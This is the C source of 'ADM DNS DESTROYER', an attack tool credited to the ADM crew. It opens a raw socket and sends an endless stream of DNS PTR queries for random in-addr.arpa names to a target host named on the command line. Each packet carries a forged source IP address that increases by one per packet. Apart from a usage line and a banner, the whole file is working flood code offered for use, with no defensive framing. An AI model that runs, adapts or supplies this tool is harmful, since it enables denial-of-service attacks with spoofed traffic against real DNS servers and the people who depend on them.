/*   ADM DNS DESTROYER  */


#define  DNSHDRSIZE 12
#define  VERSION    "0.2 pub"
#define  ERROR  -1

#include <stdio.h>
#include <stdlib.h>      
#include "ADM-spoof.c"
#include "dns.h"
#include "ADMDNS2.c"

                     
void main(int argc, char **argv)
   {
	 struct   dnshdr *dns;
	 char            *data;
         char            buffer2[4000];
         unsigned char   namez[255];     
	 unsigned long   s_ip;
	 unsigned long   d_ip;                      
	 int sraw,on=1;


if(argc <2){printf(" usage : %s <host> \n",argv[0]); exit(0);}
	
 dns    = (struct dnshdr  *)buffer2;
 data   = (char *)(buffer2+12);
 bzero(buffer2,sizeof(buffer2));

if( (sraw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR){
  perror("socket");
  exit(ERROR);
  }
  
 if( (setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR){
   perror("setsockopt");
   exit(ERROR);
   }

printf("ADMdnsFuker %s  DNS DESTROYER  made by the ADM crew\n",VERSION);
printf("(c) ADM,Heike vouais tous se ki est as moi est a elle aussi ...\n");
sleep(1);

s_ip=host2ip("100.1.2.3");
d_ip=host2ip(argv[1]);

    
       
       dns->id      = 123;
       dns->rd      = 1;
       dns->que_num = htons(1);
      
      while(1){            
                           
                  sprintf(namez,"\3%d\3%d\3%d\3%d\07in-addr\04arpa",myrand(),myrand(),myrand(),myrand());        
                  printf("%s\n",namez);
                  strcpy(data,namez);
                  *( (u_short *) (data+strlen(namez)+1) ) = ntohs(12);
                  *( (u_short *) (data+strlen(namez)+3) ) = ntohs(1);
                  udp_send(sraw,s_ip,d_ip,2600+myrand(),53,buffer2,14+strlen(namez)+5);
                  s_ip=ntohl(s_ip);
                  s_ip++;
                  s_ip=htonl(s_ip);   
              
            }

}